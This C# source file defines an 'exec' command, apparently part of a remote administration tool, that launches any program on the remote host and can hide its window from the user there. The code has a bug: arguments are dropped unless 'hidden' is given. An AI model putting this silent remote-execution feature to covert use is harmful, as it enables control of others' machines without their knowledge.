using System;
using System.Collections.Generic;
using System.Diagnostics;
using Shared;

namespace Commands
{
    internal class Execute : ICommand
    {
        public string name { get; set; } = "exec";

        public string description { get; set; } = "Execute a program on the remote host computer.\nArguments must be passed in double quotes.\nUse the 'hidden' keyword to hide the new process window.";

        public string syntaxHelper { get; set; } = "exec [remoteProgramPath] [\"arguments\"] [hidden]";

        public bool isLocal { get; set; } = false;

        public List<string> validArguments { get; set; } = new List<string>()
        {
            "? hidden",
            "? ? hidden",
            "?",
            "? ?"
        };


        public bool PreProcessCommand(List<string> args)
        {
            throw new NotImplementedException();
        }

        public void ClientMethod(List<string> args)
        {
            if (CommandsManager.networkManager.ReadLine() == "OK")
            {
                ColorTools.WriteCommandSuccess("Program executed");
            }
            else
            {
                ColorTools.WriteCommandError("An error occured, maybe the specified file doesn't exist");
            }
        }

        public void ServerMethod(List<string> args)
        {
            var startInfo = new ProcessStartInfo(args[0]);
            if (args.Count > 1)
            {
                if (args.Contains("hidden"))
                {
                    if (args.Count == 3)
                    {
                        startInfo.Arguments = args[1];
                    }
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    startInfo.CreateNoWindow = true;
                }
            }

            try
            {
                Process.Start(startInfo);
                CommandsManager.networkManager.WriteLine("OK");
            }
            catch (Exception)
            {
                CommandsManager.networkManager.WriteLine("KO");
            }
        }
    }
}
